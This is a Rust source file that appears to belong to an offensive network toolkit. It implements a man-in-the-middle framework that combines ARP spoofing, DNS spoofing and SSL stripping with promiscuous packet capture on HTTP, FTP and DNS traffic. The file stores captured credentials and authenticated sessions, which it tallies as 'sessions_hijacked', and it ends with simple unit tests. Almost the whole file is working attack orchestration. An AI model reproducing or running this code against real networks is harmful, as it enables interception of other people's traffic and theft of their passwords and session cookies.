use crate::arp::{ArpSpoofer, ArpSpooferConfig};
use crate::capture::CaptureConfig;
use crate::creds::{CapturedCredential, CredSniffer};
use crate::dns_spoof::{DnsSpoofer, DnsSpooferConfig};
use crate::session::{HttpSession, SessionHunter};
use crate::sslstrip::{SslStripConfig, SslStripProxy};
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

#[derive(Debug, Clone)]
pub struct MitmConfig {
    pub interface: String,
    pub gateway_ip: Ipv4Addr,
    pub target_ip: Ipv4Addr,
    pub enable_arp_spoof: bool,
    pub enable_dns_spoof: bool,
    pub enable_ssl_strip: bool,
    pub enable_cred_sniff: bool,
    pub dns_spoof_map: HashMap<String, Ipv4Addr>,
    pub sslstrip_port: u16,
    pub auto_restore_arp: bool,
}

impl Default for MitmConfig {
    fn default() -> Self {
        let mut dns_map = HashMap::new();
        dns_map.insert("example.com".to_string(), Ipv4Addr::new(192, 168, 1, 100));
        MitmConfig {
            interface: String::new(),
            gateway_ip: Ipv4Addr::new(192, 168, 1, 1),
            target_ip: Ipv4Addr::new(192, 168, 1, 100),
            enable_arp_spoof: true,
            enable_dns_spoof: false,
            enable_ssl_strip: false,
            enable_cred_sniff: true,
            dns_spoof_map: dns_map,
            sslstrip_port: 8080,
            auto_restore_arp: true,
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct MitmStats {
    pub packets_captured: u64,
    pub credentials_captured: u64,
    pub sessions_hijacked: u64,
    pub dns_queries_spoofed: u64,
    pub ssl_strips_performed: u64,
    pub arp_packets_sent: u64,
}

pub struct MitmFramework {
    pub config: MitmConfig,
    pub stats: Arc<Mutex<MitmStats>>,
    pub credentials: Arc<Mutex<Vec<CapturedCredential>>>,
    pub sessions: Arc<Mutex<Vec<HttpSession>>>,
    running: Arc<AtomicBool>,
}

impl MitmFramework {
    pub fn new(config: MitmConfig) -> Self {
        MitmFramework {
            config,
            stats: Arc::new(Mutex::new(MitmStats::default())),
            credentials: Arc::new(Mutex::new(Vec::new())),
            sessions: Arc::new(Mutex::new(Vec::new())),
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn start(&mut self) -> Result<(), String> {
        self.running.store(true, Ordering::SeqCst);
        let running_main = self.running.clone();
        let config = self.config.clone();
        let stats = self.stats.clone();
        let credentials = self.credentials.clone();
        let sessions = self.sessions.clone();

        if config.enable_arp_spoof {
            let arp_config = ArpSpooferConfig {
                interface: config.interface.clone(),
                gateway_ip: config.gateway_ip,
                target_ip: config.target_ip,
                ..Default::default()
            };
            let mut spoofer = ArpSpoofer::new(arp_config);
            spoofer.start()?;
            let arp_stats = spoofer.stats.clone();
            let stats = stats.clone();
            let running = running_main.clone();
            thread::spawn(move || {
                while running.load(Ordering::SeqCst) {
                    if let Ok(arp) = arp_stats.lock() {
                        if let Ok(mut s) = stats.lock() {
                            s.arp_packets_sent = arp.packets_sent;
                        }
                    }
                    thread::sleep(Duration::from_secs(1));
                }
            });
        }

        if config.enable_dns_spoof {
            let dns_config = DnsSpooferConfig {
                interface: config.interface.clone(),
                spoof_map: config.dns_spoof_map.clone(),
                ..Default::default()
            };
            let mut spoofer = DnsSpoofer::new(dns_config);
            spoofer.start()?;
            let dns_stats = spoofer.stats.clone();
            let stats = stats.clone();
            let running = running_main.clone();
            thread::spawn(move || {
                while running.load(Ordering::SeqCst) {
                    if let Ok(dns) = dns_stats.lock() {
                        if let Ok(mut s) = stats.lock() {
                            s.dns_queries_spoofed = dns.queries_spoofed;
                        }
                    }
                    thread::sleep(Duration::from_secs(1));
                }
            });
        }

        if config.enable_ssl_strip {
            let ssl_config = SslStripConfig {
                interface: config.interface.clone(),
                listen_port: config.sslstrip_port,
                ..Default::default()
            };
            let mut proxy = SslStripProxy::new(ssl_config);
            proxy.start()?;
            let ssl_stats = proxy.stats.clone();
            let stats = stats.clone();
            let running = running_main.clone();
            thread::spawn(move || {
                while running.load(Ordering::SeqCst) {
                    if let Ok(ssl) = ssl_stats.lock() {
                        if let Ok(mut s) = stats.lock() {
                            s.ssl_strips_performed = ssl.https_redirects_stripped;
                        }
                    }
                    thread::sleep(Duration::from_secs(1));
                }
            });
        }

        let _capture_config = CaptureConfig {
            interface: Some(config.interface.clone()),
            bpf_filter: "tcp port 80 or tcp port 8080 or tcp port 21 or udp port 53".to_string(),
            ..Default::default()
        };
        let running = running_main.clone();

        thread::spawn(move || {
            let mut cred_sniffer = CredSniffer::new();
            let mut session_hunter = SessionHunter::new();

            let cap = pcap::Capture::from_device(config.interface.as_str())
                .and_then(|d| d.promisc(true).snaplen(65535).timeout(1000).open())
                .map(|mut c| {
                    c.filter("tcp port 80 or tcp port 8080 or tcp port 21 or udp port 53", true).ok();
                    c
                });

            match cap {
                Ok(mut cap) => {
                    while running.load(Ordering::SeqCst) {
                        match cap.next_packet() {
                            Ok(pkt) => {
                                let info = crate::packet::parse_packet(pkt.data, pkt.header.len as usize);
                                if let Ok(mut s) = stats.lock() {
                                    s.packets_captured += 1;
                                }

                                if let Some(cred) = cred_sniffer.analyze(&info) {
                                    if let Ok(mut c) = credentials.lock() {
                                        c.push(cred);
                                    }
                                    if let Ok(mut s) = stats.lock() {
                                        s.credentials_captured += 1;
                                    }
                                }

                                if let Some(session) = session_hunter.analyze(&info) {
                                    if session.is_authenticated {
                                        if let Ok(mut sess) = sessions.lock() {
                                            sess.push(session.clone());
                                        }
                                        if let Ok(mut s) = stats.lock() {
                                            s.sessions_hijacked += 1;
                                        }
                                    }
                                }
                            }
                            Err(pcap::Error::TimeoutExpired) => continue,
                            Err(_) => break,
                        }
                    }
                }
                Err(e) => {
                    eprintln!("MITM capture error: {}", e);
                }
            }
        });

        Ok(())
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn stats(&self) -> MitmStats {
        self.stats.lock().map(|g| g.clone()).unwrap_or_default()
    }

    pub fn captured_credentials(&self) -> Vec<CapturedCredential> {
        self.credentials.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    pub fn captured_sessions(&self) -> Vec<HttpSession> {
        self.sessions.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mitm_config_default() {
        let config = MitmConfig::default();
        assert!(config.enable_arp_spoof);
        assert!(!config.enable_dns_spoof);
        assert!(!config.enable_ssl_strip);
        assert_eq!(config.sslstrip_port, 8080);
    }

    #[test]
    fn test_mitm_framework_new() {
        let mitm = MitmFramework::new(MitmConfig::default());
        assert!(!mitm.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_mitm_stats_default() {
        let stats = MitmStats::default();
        assert_eq!(stats.packets_captured, 0);
    }

    #[test]
    fn test_mitm_with_dns_spoof() {
        let mut config = MitmConfig::default();
        config.enable_dns_spoof = true;
        let mitm = MitmFramework::new(config);
        assert!(mitm.config.enable_dns_spoof);
    }

    #[test]
    fn test_mitm_empty_credentials() {
        let mitm = MitmFramework::new(MitmConfig::default());
        assert!(mitm.captured_credentials().is_empty());
    }
}
